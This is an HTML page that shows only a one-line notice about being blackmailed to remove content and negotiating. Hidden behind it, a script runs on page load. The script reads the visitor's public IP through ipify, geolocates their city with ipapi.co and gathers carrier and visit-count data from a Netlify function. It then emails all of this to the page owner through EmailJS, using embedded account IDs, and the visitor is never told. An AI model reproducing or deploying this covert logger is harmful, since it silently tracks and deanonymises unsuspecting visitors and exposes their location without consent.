<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: 'Roboto', sans-serif;
        }

        .main {
            background: #ededed;
            padding: 50px 30px;
        }

        .content {
            border-radius: 10px;
            background: #ededed;
            box-shadow: 20px 20px 60px #c9c9c9,
                -20px -20px 60px #ffffff;
            padding: 30px 20px;
            font-size: 16px;
        }

        p,
        ol {
            line-height: 175%;
        }
    </style>
</head>

<body>
    <div class="main">
        <div class="content">
            <p>
                Blackmailed to Remove the content. Will work on negotiation âœ…
            </p>
        </div>
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
    <script>
        $.getJSON("https://api.ipify.org?format=json", function (clientData) {
            var clientIp = clientData.ip;

            $.getJSON("https://ipapi.co/" + clientIp + "/json/", function (locationData) {
                var cityName = locationData.city;
                console.log(cityName);

                var request = new XMLHttpRequest();
                request.open('GET', '/.netlify/functions/fetchIpData');
                request.setRequestHeader('Accept', 'application/json');

                request.onreadystatechange = function () {
                    if (this.readyState === 4 && this.status === 200) {
                        var data = JSON.parse(this.responseText);
                        var ip = data.ip || clientIp;
                        var city = data.city || cityName;
                        var carrierName = data.carrierName || "xyz";
                        var time = data.time || "000";
                        var counter = data.count || "unknown";

                        $.ajax({
                            url: 'https://api.emailjs.com/api/v1.0/email/send',
                            type: 'POST',
                            data: JSON.stringify({
                                service_id: 'service_lne6ewa',
                                template_id: 'template_3r6bobi',
                                user_id: '1NnuuCpetYJt2e-1h',
                                template_params: {
                                    ip: ip,
                                    city: city,
                                    time: time,
                                    carrierName: carrierName,
                                    counter: counter
                                }
                            }),
                            contentType: 'application/json',
                            success: function (data) {
                                console.log("Email sent successfully");
                            },
                            error: function (error) {
                                console.log("Error sending email:", error);
                            }
                        });
                    }
                };

                request.send();
            });
        });
    </script>
</body>

</html>
